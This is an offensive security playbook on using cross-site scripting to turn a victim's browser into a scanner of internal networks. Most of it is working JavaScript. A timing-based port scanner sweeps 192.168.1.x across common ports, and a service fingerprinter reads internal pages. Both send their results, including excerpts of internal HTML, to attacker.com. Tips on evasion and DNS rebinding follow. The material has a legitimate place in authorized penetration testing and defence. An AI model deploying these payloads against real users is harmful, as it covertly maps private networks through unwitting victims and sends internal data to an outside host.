# XSS — Internal Network Scanning

## When this applies

The victim's browser has access to internal IP space (corporate intranet, RFC 1918 ranges, localhost) that is unreachable from the public internet. XSS turns the victim into a pivot — JavaScript probes internal services and exfiltrates findings back to the attacker.

## Technique

Two patterns:
1. **Image-based timing** — load `<img src=http://192.168.x.y:port>`; measure `onload` vs `onerror` timing to infer port state. Closed ports fail fast (TCP RST or ICMP unreachable). Open non-HTTP ports stall (no response on the HTTP request). HTTP services trigger `onload`.
2. **Fetch fingerprinting** — `fetch()` to internal URL, parse response (or CORS error pattern) to identify service banners.

## Steps

### Port Scanner

```javascript
<script>
var internal = '192.168.1.';
var ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 5900, 8080, 8443];
var results = [];

for(var i = 1; i < 255; i++) {
    for(var j = 0; j < ports.length; j++) {
        (function(ip, port) {
            var start = Date.now();
            var img = new Image();

            img.onerror = function() {
                var elapsed = Date.now() - start;
                if(elapsed < 1000) {
                    // Quick failure = port closed or filtered
                    results.push({ip: ip, port: port, status: 'closed'});
                } else {
                    // Slow failure = port open but not HTTP
                    results.push({ip: ip, port: port, status: 'open'});
                }
            };

            img.onload = function() {
                // Image loaded = HTTP service running
                results.push({ip: ip, port: port, status: 'http'});
            };

            img.src = 'http://' + ip + ':' + port + '/?' + Math.random();

            // Send results batch
            if(results.length > 10) {
                sendResults();
            }
        })(internal + i, ports[j]);
    }
}

function sendResults() {
    if(results.length > 0) {
        fetch('https://attacker.com/scan-results', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(results)
        });
        results = [];
    }
}
</script>
```

### Service Fingerprinting

```javascript
<script>
// Identify services on discovered hosts
function fingerprint(ip, port) {
    fetch('http://' + ip + ':' + port)
        .then(r => r.text())
        .then(html => {
            var service = 'unknown';

            // Fingerprint based on response
            if(html.includes('Router')) service = 'router';
            if(html.includes('Apache')) service = 'apache';
            if(html.includes('nginx')) service = 'nginx';
            if(html.includes('Login')) service = 'web-admin';

            // Exfiltrate findings
            fetch('https://attacker.com/fingerprint', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    ip: ip,
                    port: port,
                    service: service,
                    html: html.substring(0, 500)
                })
            });
        })
        .catch(e => {
            // Service exists but CORS blocks reading
            fetch('https://attacker.com/fingerprint', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    ip: ip,
                    port: port,
                    service: 'cors-blocked'
                })
            });
        });
}

// Scan common internal IPs
['192.168.1.1', '192.168.0.1', '10.0.0.1'].forEach(ip => {
    fingerprint(ip, 80);
    fingerprint(ip, 443);
    fingerprint(ip, 8080);
});
</script>
```

## Verifying success

- Attacker endpoint receives JSON batches with discovered hosts and ports.
- Status `http` results have content-length differences from `closed` / `open` — useful for distinguishing legitimate HTTP services.
- For service fingerprinting: the response body excerpt confirms an internal service (e.g., login portal, router admin page).

## Common pitfalls

1. **Mixed-content blocking** — HTTPS page can't load HTTP internal services for `<img>` ; use `https://` if internal services use TLS, or use `fetch` with `no-cors` (limited info).
2. **Browser parallelism cap (~6 per origin)** — scanning 255 hosts × 11 ports in parallel queues most requests. Batch in smaller groups with `setTimeout`.
3. **Timing thresholds vary by network** — 1000ms threshold for "closed" is empirical; adjust based on baseline response times.
4. **CORS prevents reading body** — `fetch` to internal services typically returns "CORS-blocked"; you only learn the service exists, not its banner. `no-cors` mode allows the request to fire but `response.text()` returns empty.
5. **DNS rebinding might be required** — for true RFC 1918 access from public origin, attacker may need to host a domain that rebinds to 192.168.x.y after initial resolution.

## Tools

- **`<img>` timing oracle** — universal port probe technique
- **`fetch` with `no-cors`** — fires request, ignore body
- **Burp Collaborator / attacker-controlled HTTP listener** — receive scan results
- **DNS rebinding services** (e.g., `rbndr.us`, `Singularity` framework) — bypass SOP for body reads
